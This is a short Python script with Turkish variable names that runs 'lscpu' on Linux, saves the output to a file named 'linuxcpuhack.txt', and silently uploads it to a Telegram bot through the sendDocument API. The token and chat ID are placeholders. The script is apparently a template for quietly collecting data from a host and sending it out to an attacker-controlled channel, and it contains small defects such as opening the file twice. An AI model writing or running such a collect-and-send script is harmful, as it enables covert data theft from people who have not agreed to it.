import requests 
import subprocess
 
TOKEN = "tokeniniz"
chat_id = "chat_id"

def cpubilgial_linux(): 
    cpu_info = subprocess.run(["lscpu"], stdout=subprocess.PIPE, text=True)
    çıktı = cpu_info.stdout

 
    with open("linuxcpuhack.txt", "w") as dosya:
        dosya.write(çıktı) 
    
    
    dosyakonumu = subprocess.run(["realpath", "linuxcpuhack.txt"], stdout=subprocess.PIPE, text=True)
    dosyakonumu_str = dosyakonumu.stdout.strip()
    file_path = "linuxcpuhack.txt"
    
    api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
  
    with open(file_path, "rb") as file:
        files = {"document": open(file_path, "rb")}
        response = requests.post(api, data={"chat_id": chat_id}, files=files)


cpubilgial_linux()
